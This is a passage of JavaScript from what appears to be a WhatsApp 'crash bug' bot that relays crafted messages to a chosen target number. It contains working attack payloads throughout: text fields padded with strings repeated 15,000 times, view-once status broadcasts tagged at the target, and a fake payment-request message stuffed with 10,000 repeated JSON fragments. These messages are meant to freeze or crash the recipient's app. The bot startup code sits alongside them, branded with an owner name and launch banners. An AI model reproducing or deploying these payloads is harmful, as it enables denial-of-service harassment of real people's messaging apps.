      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: {
            text: "Rexz Official - ID",
            matchedText: "https://t.me/RexzXyz",
            description: "RexzXyz".repeat(15000),
            title: "Deathles" + "Invictuz".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      await Rexz.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await Rexz.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
   } catch (err) {
      console.error(err);
   }
};

async function HeavenSqL(target) {
let msg = generateWAMessageFromContent(target, {
  interactiveMessage: {
    header: {
      jpegThumbnail: thumb, 
      hasMediaAttachment: true
    }, 
    nativeFlowMessage: {
      buttons: [
        {
          name: "review_and_pay",
          buttonParamsJson: "{\"currency\":\"YEN\",\"total_amount\":{\"value\":1000000,\"offset\":100},\"reference_id\":\"7eppeli-Yuukey\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b\",\"name\":\"D | 7eppeli-Exploration\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":1},{\"retailer_id\":\"custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b\",\"name\":\"D | 7eppeli-Exploration\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":1},{\"retailer_id\":\"custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b\",\"name\":\"D | 7eppeli-Exploration\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":1}]},\"additional_note\":\"D | 7eppeli-Exploration\",\"native_payment_methods\":[],\"share_payment_status\":true}"
        }
      ],
      messageParamsJson: "{}".repeat(10000)
    }, 
  }
}, {});
  
  await Rexz.relayMessage(target, msg.message, {
    participant: { jid:target }, 
    messageId: msg.key.id
  }) 
}

// --- Jalankan Bot ---
(async () => {
  console.clear();
  console.log("⟐ Memulai sesi WhatsApp...");
  startSesi();

  // Langsung lanjut tanpa cek token database
  console.log(`
     ⣠⣶⣶⣦⡀
    ⢰⣿⣿⣿⣿⣿            
     ⠻⣿⣿⡿⠋            
    ⣴⣶⣶⣄              
   ⣸⣿⣿⣿⣿⡄             
  ⢀⣿⣿⣿⣿⣿⣧   
  ⣼⣿⣿⣿⡿⣿⣿⣆      ⣠⣴⣶⣤⡀ 
 ⢰⣿⣿⣿⣿⠃⠈⢻⣿⣦    ⣸⣿⣿⣿⣿⣷ 
 ⠘⣿⣿⣿⡏⣴⣿⣷⣝⢿⣷⢀ ⢀⣿⣿⣿⣿⡿⠋ 
  ⢿⣿⣿⡇⢻⣿⣿⣿⣷⣶⣿⣿⣿⣿⣿⣷    
  ⢸⣿⣿⣇⢸⣿⣿⡟⠙⠛⠻⣿⣿⣿⣿⡇    
⣴⣿⣿⣿⣿⣿⣿⣿⣠⣿⣿⡇   ⠉⠛⣽⣿⣇⣀⣀⣀ 
⠙⠻⠿⠿⠿⠿⠿⠟⠿⠿⠿⠇     ⠻⠿⠿⠛⠛⠛⠃
(!) Succes, Thanks For Using
  `);

  console.log("Sukses Connected");
  bot.launch();

  // Tampilkan banner
  const figlet = require('figlet');
  console.clear();
  console.log(
    chalk.cyan(
      figlet.textSync('AH AH AH', {
        font: 'Standard',
        horizontalLayout: 'default',
        verticalLayout: 'default',
      })
    )
  );

  console.log(chalk.bold.white("OWNER:") + chalk.bold.blue(" RexzTyz"));
  console.log(chalk.bold.white("VERSION:") + chalk.bold.blue(" 1\n"));
  console.log(chalk.bold.green("Bot Is Running. . ."));
})();